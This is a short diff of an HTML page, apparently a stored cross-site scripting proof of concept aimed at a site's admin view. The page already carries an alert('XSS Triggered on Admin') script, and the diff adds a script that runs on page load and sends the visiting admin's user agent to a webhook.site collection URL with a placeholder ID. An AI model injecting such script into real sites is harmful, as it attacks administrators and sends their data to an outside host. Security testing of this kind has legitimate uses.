@@ -8,6 +8,11 @@
 </head>
   <body>
      <script>alert('XSS Triggered on Admin')</script>
+      <h1>XSS Triggered!</h1>
+<script>
+  // Send a beacon when visited (admin-side)
+  fetch("https://webhook.site/YOUR-UNIQUE-ID?hit=admin&ua=" + navigator.userAgent);
+</script>
 
     
   </body>
